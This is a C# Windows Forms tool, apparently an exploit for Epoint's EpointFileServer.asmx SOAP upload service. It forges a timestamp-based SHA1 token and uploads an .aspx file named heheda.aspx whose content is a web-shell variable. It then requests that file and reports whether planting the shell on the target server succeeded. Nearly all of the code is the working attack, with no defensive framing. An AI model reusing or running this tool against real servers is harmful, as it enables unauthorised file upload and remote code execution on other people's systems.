using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Xml;
using System.Net;
using System.IO;
using Microsoft.Practices.EnterpriseLibrary.Common;
using Epoint.Frame.Common;

using System.Windows.Forms;

namespace soaptool
{
    public partial class Form1 : Form
    {
       

        protected void sendSoapMessage(string myurl)
        {
            string allurl = myurl + "/EpointBigFileUpload/FCKFile/EpointFileServer.asmx";
            string shell = "";

            DateTime now = DateTime.Now;
            now = new DateTime(Convert.ToInt64(DateTime.Now.Ticks));
            string a = EncryptOperate.SHA1Encrypt(now);


            XmlDocument doc = new XmlDocument();
            doc.InnerXml = @"<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
              <soap:Body>
                <UploadFile xmlns=""http://tempuri.org/"">
                <fs>"+shell+@"</fs>
                <fileName>heheda.aspx</fileName>
                <dtTicks>" + DateTime.Now.Ticks + @"</dtTicks>
                <encryption>"+a+@"</encryption>
                </UploadFile>
              </soap:Body>
            </soap:Envelope>";



            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(allurl);
            //if (proxy != null) req.Proxy = new WebProxy(proxy, true);
            // req.Headers.Add("GetClientInfo", "http://tempuri.org/GetClientInfo");

            req.ContentType = "text/xml;charset=\"utf-8\"";
            req.Accept = "text/xml";
            req.Method = "POST";




            Stream stm = req.GetRequestStream();
            doc.Save(stm);
            stm.Close();
            WebResponse resp = req.GetResponse();

            stm = resp.GetResponseStream();
            StreamReader r = new StreamReader(stm);
         string res=r.ReadToEnd();
            textBox1.Text = res;


        }


        public void  senhttp(string myurl)
        {
            string allurl = myurl + "/EpointBigFileUpload/FCKFile/heheda.aspx";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(allurl);
            request.Method = "GET";
            request.ContentType = "text/html;charset=UTF-8";

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if(Convert.ToInt32(response.StatusCode)== 200)
            {
                MessageBox.Show("成功");
                textBox3.Text =allurl ;
            }
            else
            {
                MessageBox.Show("失败");
            }
            response.Close();

        }
    
    public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string myurl = textBox2.Text.Trim();
            if(myurl=="")
            {
                MessageBox.Show("请输入地址");
            }
            else
            {
                sendSoapMessage(myurl);
                senhttp(myurl);

            }
           

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
